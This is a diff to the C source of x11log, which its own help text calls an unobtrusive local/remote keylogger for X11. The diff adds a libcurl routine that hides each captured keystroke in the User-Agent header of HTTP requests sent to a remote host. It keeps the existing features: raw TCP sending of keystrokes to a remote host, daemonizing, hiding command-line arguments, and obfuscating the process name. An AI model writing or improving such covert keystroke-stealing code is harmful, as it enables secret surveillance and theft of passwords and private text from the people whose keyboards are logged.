@@ -11,6 +11,10 @@
  *   - although cmdline arguments are removed, the TCP port number is still
  *     shown in the process tree.
  *   - process_name in obfuscation mode shouldn't be statically defined
+ *   - keys which are pressed for a longer period of time, they are not
+ *     logged multiple times (this would depend on the repeat delay and
+ *     speed of X keyboard settings); although this is not (yet) implemented,
+ *     it won't have much impact on "regular" logs.
  * */
 
 #include <stdio.h>
@@ -32,6 +36,10 @@
 #include <X11/Xlib.h>
 #include <X11/X.h>
 
+#ifdef _HAVE_CURL
+  #include <curl.h>
+#endif //_HAVE_CURL
+
 #include "x11log.h"
 
 
@@ -43,49 +51,58 @@ static char keymap[2][XKBD_WIDTH],
 		*kbd = keymap[0],
 		*tmp = keymap[1];
 
-static FILE *output;
 static XModifierKeymap *map;
 static Display *dsp;
 static int verbosity = 1;
-static struct opts_struct* options;
 
+/* flags set via signal handler */
+static int flag_exit = 0;
+static int flag_flush = 0;
 
 /* Here we go. */
 int main (int argc, char ** argv) {
 	int i;
 	struct tm *timestart;
-	struct opts_struct opts;
+	struct config_struct config;
+	char* keystroke;
 
-	options = &opts;
-	timestart = initialize(argc, argv, &opts);
+	timestart = initialize(argc, argv, &config);
 
 	/* NULL defaults to what is given in DISPLAY environment variable. However,
 	 * in some cases (e.g. within a VC) this variable is not set; so better go
 	 * with :0.0, which is the correct default display in 99% of all cases. This
 	 * also works via SSH connections, as long as getuid() user is running X. */
-	dsp = XOpenDisplay( (opts.display) ? opts.display : X_DEFAULT_DISPLAY );
+	dsp = XOpenDisplay( (config.display) ? config.display : X_DEFAULT_DISPLAY );
 	if(!dsp)
 		fatal("Cannot open display");
 
 	XSynchronize (dsp, True);
 	map = XGetModifierMapping(dsp);
 
-	XQueryKeymap(dsp, kbd);
 	log(1, stderr, "\n\n--New Session at %s\n", asctime(timestart));
 
 	/* we'll only try to find changed keys */
-	for(;; usleep(DELAY)){
+	for(XQueryKeymap(dsp, kbd);; usleep(DELAY)){
+		//check if signal handler set global flags
+		if(flag_exit)
+			clean_exit(&config);
+		if(!--flag_flush)
+			fflush(config.logfd);
+
 		SWAP(kbd, tmp, char*);
 		XQueryKeymap(dsp, kbd);
 
-		for (i = 0; i < XKBD_WIDTH * BYTE_LENGTH; i++)
+		for( i = 0; i < XKBD_WIDTH * BITS_PER_BYTE; i++ )
 			if(getbit(kbd, i) != getbit(tmp, i) && getbit(kbd, i)) {
-				log( 1, output, "%s", (char*)decodeKey(i, getbit(kbd, i), getMods(kbd)));
-				fflush(output);
+				keystroke = decodeKey(i, getbit(kbd, i), getMods(kbd));
+				log( 1, config.logfd, "%s", keystroke);
+				fflush(config.logfd);
 
-				if(opts.log_remote)
-					transmit_keystroke_inet((char*)
-						decodeKey(i, getbit(kbd, i), getMods(kbd)), &opts);
+				if(config.log_remote_inet)
+					transmit_keystroke_inet(keystroke, &config);
+
+				if(config.log_remote_http)
+					transmit_keystroke_http(keystroke, &config);
 			}
 	}
 }
@@ -94,7 +111,7 @@ int main (int argc, char ** argv) {
  * Initialization stuff: parse arguments, define signal handlers, define
  * output stream, set default options. Returns time when init() finished.
  * */
-struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
+struct tm* initialize(int argc, char ** argv, struct config_struct* config) {
 	int c, i, j;
 	time_t rawtime;
 
@@ -104,101 +121,114 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
 	signal(SIGHUP,  signal_handler);
 
 	/* set default values for cmdline options */
-	opts->display = X_DEFAULT_DISPLAY;
-	opts->logfile = NULL;
-	opts->silent = 0;
-	opts->log_remote = 0;
-	opts->remote_addr = NULL;
-	opts->host = NULL;
-	opts->port = 0;
-	opts->daemonize = 0;
-	opts->obfuscate = 0;
+	config->display = X_DEFAULT_DISPLAY;
+	config->logfile = NULL;
+	config->logfd = stdout;
+	config->silent = 0;
+	config->log_remote_inet = 0;
+#ifdef _HAVE_CURL
+	config->log_remote_http = 0;
+#endif
+	config->remote_addr = NULL;
+	config->host = NULL;
+	config->port = 0;
+	config->daemonize = 0;
+	config->obfuscate = 0;
 
 	/* parse cmdline arguments */
-	while((c = getopt(argc, argv, "s:f:h?r:qdo")) != -1){
+	while((c = getopt(argc, argv, "s:f:h:?r:qdo")) != -1){
 		switch(c) {
-			case 's':
-				if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
-					break;
+		  case 's':
+			if(strcmp(optarg, X_DEFAULT_DISPLAY) == 0)
+				break;
 
-				opts->display = smalloc(sizeof(char) * strlen(optarg) + 1);
-				strncpy(opts->display, optarg, strlen(optarg));
-				break;
-			case 'f':
-				opts->logfile = smalloc(sizeof(char) * strlen(optarg) + 1);
-				strncpy(opts->logfile, optarg, strlen(optarg));
-				break;
-			case 'r':
-				opts->remote_addr = optarg;
-				opts->log_remote = 1;
-				break;
-			case 'q':
-				opts->silent = 1;
-				verbosity = 0;
-				break;
-			case 'd':
-				opts->daemonize = 1;
-				break;
-			case 'o':
-				opts->obfuscate= 1;
-				break;
-			case 'h':
-			case '?':
-				log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
-				log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
-				log(0, stderr, " Available options:\n");
-				log(0, stderr, "\t-s <DISPLAY>    X-Display to use, default is :0.0\n");
-				log(0, stderr, "\t-f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
-				log(0, stderr, "\t-r <HOST:PORT>  Log keystrokes to remote host. The other end needs a program listening on specified\n\t\t\tTCP port (e.g. using BSD netcat: 'nc -p <port> -k')\n");
-				log(0, stderr, "\t-d              Daemonize (requires -f or -r or both).\n");
-				log(0, stderr, "\t-q              Be quiet (no output to console).\n");
-				log(0, stderr, "\t-o              Obfuscate process name in process table.\n");
-				log(0, stderr, "\t-h|-?           Print usage.\n");
+			config->display = smalloc(sizeof(char) * strlen(optarg) + 1);
+			strncpy(config->display, optarg, strlen(optarg));
+			break;
+		  case 'f':
+			config->logfile = smalloc(sizeof(char) * strlen(optarg) + 1);
+			strncpy(config->logfile, optarg, strlen(optarg));
+			break;
+#ifdef _HAVE_CURL
+		  case 'h':
+			config->host = smalloc(sizeof(char) * strlen(optarg) + 1);
+			strcpy(config->host, optarg);
+			config->log_remote_http = 1;
+			break;
+#endif
+		  case 'r':
+			config->remote_addr = optarg;
+			config->log_remote_inet = 1;
+			break;
+		  case 'q':
+			config->silent = 1;
+			verbosity = 0;
+			break;
+		  case 'd':
+			config->daemonize = 1;
+			break;
+		  case 'o':
+			config->obfuscate= 1;
+			break;
+		  //case 'h':
+		  case '?':
+			log(0, stderr, " x11log - a tiny, non-privileged, unobtrusive local/remote keylogger for X11.\n (c) by Erik Sonnleitner <es@delta-xi.net> 2007/2011, licensed under GPLv3.\n\n");
+			log(0, stderr, " Usage: %s [OPTIONS]\n", argv[0]);
+			log(0, stderr, " Available options:\n");
+			log(0, stderr, "\t-s <DISPLAY>    X-Display to use, default is :0.0\n");
+			log(0, stderr, "\t-f <LOGFILE>    Log keystrokes to file instead of STDOUT. Text is appended; creates file if necessary.\n");
+			log(0, stderr, "\t-r <HOST:PORT>  Log keystrokes to remote host. The other end needs a program listening on specified\n\t\t\tTCP port (e.g. using BSD netcat: 'nc -p <port> -k')\n");
+#ifdef _HAVE_CURL
+			log(0, stderr, "\t-h <HOST>       Log keystrokes to http server, in header of HTTP requests.\n");
+#endif
+			log(0, stderr, "\t-d              Daemonize (requires -f or -r or both).\n");
+			log(0, stderr, "\t-q              Be quiet (no output to console).\n");
+			log(0, stderr, "\t-o              Obfuscate process name in process table.\n");
+			log(0, stderr, "\t-?              Print usage.\n");
 
-				exit(EXIT_FAILURE);
-			default:
-				break;
+			exit(EXIT_FAILURE);
+		  default:
+			break;
 		}
 	}
 
 	/* logical constraints */
-	if(opts->silent && !(opts->log_remote || opts->logfile))
-		fatal("Argument -q requires either logging to file or remote host (-r|-f)");
-	if(opts->daemonize && !(opts->log_remote || opts->logfile))
-		fatal("Argument -d requires either logging to file or remote host (-r|-f)");
-	if(opts->obfuscate && !opts->daemonize)
+	if(config->silent && !(config->log_remote_inet || config->log_remote_http || config->logfile))
+		fatal("Argument -q requires either logging to file or remote host (-r|-h|-f)");
+	if(config->daemonize && !(config->log_remote_inet || config->log_remote_http || config->logfile))
+		fatal("Argument -d requires either logging to file or remote host (-r|-h|-f)");
+	if(config->obfuscate && !config->daemonize)
 		fatal("Argument -o requires daemonization (-d)");
 
 	/* log to file if given, use stdout otherwise  */
-	if(opts->logfile == NULL) {
-		output = stdout;
-	} else {
-		output = fopen(opts->logfile, "a");
-		if(!output) {
+	if(config->logfile != NULL){
+		config->logfd = fopen(config->logfile, "a");
+		if(!config->logfd) {
 			log(1, stderr, "Error writing to %s, fallback to console.\n", argv[1]);
-			output = stdout;
+			config->logfd = stdout;
 		}
 	}
 
 	/* remote logging argument validation */
-	if((opts->remote_addr != NULL)
-		&& (strstr(opts->remote_addr, ":") != NULL) && opts->log_remote) {
+	if((config->remote_addr != NULL)
+		&& (strstr(config->remote_addr, ":") != NULL)
+		&& (config->log_remote_inet)) {
 
-		char* host_tmp = strtok(opts->remote_addr, ":");
-		opts->host = smalloc(sizeof(char) * strlen(host_tmp) + 1);
-		strncpy(opts->host, host_tmp, strlen(host_tmp));
+		char* host_tmp = strtok(config->remote_addr, ":");
+		config->host = smalloc(sizeof(char) * strlen(host_tmp) + 1);
+		strncpy(config->host, host_tmp, strlen(host_tmp));
 
-		opts->port = atol( strtok(NULL, ":") );
+		config->port = atol( strtok(NULL, ":") );
 
-		if(opts->port < TCP_PORT_MIN || opts->port > TCP_PORT_MAX)
+		if(config->port < TCP_PORT_MIN || config->port > TCP_PORT_MAX)
 			fatal("Invalid tcp port number");
-	} else if (opts->remote_addr != NULL) {
+	} else if (config->remote_addr != NULL) {
 		fatal("Illegal argument for remote logging");
 	}
 
 	/* to daemonize or not to daemonize */
-	if(opts->daemonize)
-		daemonize((opts->obfuscate) ? argv[0] : NULL);
+	if(config->daemonize)
+		daemonize((config->obfuscate) ? argv[0] : NULL);
 
 	/* cmdline arguments are always hidden */
 	for(i = 1; i < argc; i++)
@@ -215,7 +245,7 @@ struct tm* initialize(int argc, char ** argv, struct opts_struct* opts) {
  * keyboard status.
  * */
 char* decodeKey(int code, int down, int mod) {
-	static char *str, dump[MAX_KEYLEN + 1];
+	static char *str, keystroke_readable[MAX_KEYLEN + 1];
 	int i = 0, remapChar = 0;
 	KeySym sym;
 
@@ -227,12 +257,12 @@ char* decodeKey(int code, int down, int mod) {
 	if(!str)
 		return "";
 
-	sprintf(dump, "%s", str);
+	sprintf(keystroke_readable, "%s", str);
 
 	/* shortenize (remap) char str if in mapping table */
 	while (remap[i].src[0]) {
-		if (strstr(dump, remap[i].src)) {
-			strcpy(dump, remap[i].dst);
+		if (strstr(keystroke_readable, remap[i].src)) {
+			strcpy(keystroke_readable, remap[i].dst);
 			remapChar = 1;
 			break;
 		}
@@ -240,20 +270,20 @@ char* decodeKey(int code, int down, int mod) {
 	}
 
 	/* no remapping, but "long" keysym */
-	if(dump[1] && !remapChar) {
+	if(keystroke_readable[1] && !remapChar) {
 		(down)
-			? sprintf(dump, "%s%s%s", "[+", str, "]")
-			: sprintf(dump, "%s%s%s", "[-", str, "]");
-		return dump;
+			? sprintf(keystroke_readable, "%s%s%s", "[+", str, "]")
+			: sprintf(keystroke_readable, "%s%s%s", "[-", str, "]");
+		return keystroke_readable;
 	}
 
 	if(mod == CONTROL_DOWN) 
-		sprintf(dump, "%c%c%c", '^', dump[0], '\0');
+		sprintf(keystroke_readable, "%c%c%c", '^', keystroke_readable[0], '\0');
 
 	if(mod == LOCK_DOWN) 
-		dump[0] = toupper(dump[0]);
+		keystroke_readable[0] = toupper(keystroke_readable[0]);
 
-	return dump;
+	return keystroke_readable;
 }
 
 /**
@@ -289,32 +319,41 @@ int getbit(char *kbd, int idx) {
 
 
 /**
- * Signal handler for SIGTERM, SIGINT and SIGHUP
+ * Signal handler for SIGTERM, SIGINT and SIGHUP. Only set global flags, which
+ * are regularly checked in main loop; this prevents us from requiring the
+ * main configuration structure on global scope.
  * */
 void signal_handler(int sig) {
 	switch(sig) {
-	  //SIGINT and SIGTERM quit application
 	  case(SIGINT):
 	  case(SIGTERM):
 		log(1, stderr, "\n -- x11log terminated.\n");
-		if(output != stdout)
-			fclose(output);
-
-		if( strcmp(options->display, X_DEFAULT_DISPLAY) != 0)
-			free( options->display );
-		if( options->host != NULL )
-			free( options->host );
-		if( options->logfile != NULL )
-			free( options->logfile );
-
-		exit(EXIT_SUCCESS);
-	  //SIGHUP forces flushing of buffer
+		flag_exit = 1;
+		return;
 	  case(SIGHUP):
-		log(1, stderr, "\n -- SIGHUP: log flushed.\n");
-		fflush(output);
+		log(1, stderr, "\n -- SIGHUP: flushing log.\n");
+		flag_flush = 1;
 	  	return; 
 	}
 }
+
+/**
+ * Clean up and exit program: Close open file descriptors and free memory.
+ * */
+void clean_exit(struct config_struct* cfg){
+	if(cfg->logfd != stdout)
+		fclose(cfg->logfd);
+
+	if( strcmp(cfg->display, X_DEFAULT_DISPLAY) != 0)
+		free( cfg->display );
+	if( cfg->host != NULL )
+		free( cfg->host );
+	if( cfg->logfile != NULL )
+		free( cfg->logfile );
+
+	exit(EXIT_SUCCESS);
+}
+
 
 /**
  * fatal: Print error message and abort execution.
@@ -332,7 +371,7 @@ void fatal(const char * msg){
  * chances are lower that the user will see a constant TCP stream in netstat
  * output, etc). Returns the number of bytes read, or negative value on error.
  * */
-int transmit_keystroke_inet(char* key, struct opts_struct *opts){
+int transmit_keystroke_inet(char* key, struct config_struct *opts){
 	int sock, bytes_sent;
 	struct hostent *host;
 	struct sockaddr_in server_addr;
@@ -357,6 +396,38 @@ int transmit_keystroke_inet(char* key, struct opts_struct *opts){
 
 	return bytes_sent;
 }
+
+
+#ifdef _HAVE_CURL
+/**
+ * Transmits
+ * */
+int transmit_keystroke_http(char* key, struct config_struct *cfg){
+	CURL* curl;
+	char *http_header_field = "User-Agent: ";
+	char *buffer;
+
+	curl = curl_easy_init();
+	if(!curl)
+		return 0;
+
+	/* create http header-line with keystroke in it */
+	struct curl_slist *headers = NULL;
+	buffer = alloca(sizeof(char) * (strlen(http_header_field) + strlen(key) +1));
+	sprintf(buffer, "%s%s", http_header_field, key);
+	headers = curl_slist_append(headers, buffer);
+
+	/* build http request and send */
+	curl_easy_setopt(curl, CURLOPT_URL, cfg->host );
+	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, curl_blackhole);
+	curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+	if (curl_easy_perform(curl) != 0)
+		return 0;
+
+	curl_easy_cleanup(curl);
+	return 1;
+}
+#endif //_HAVE_CURL
 
 /**
  * printf() wrapper, taking care of debug levels
@@ -420,3 +491,10 @@ void* smalloc(size_t size) {
 
 	return ptr;
 }
+
+#ifdef _HAVE_CURL
+size_t curl_blackhole(void* unused, size_t size, size_t nmemb, void* none) {
+	return size * nmemb;
+}
+#endif //_HAVE_CURL
+
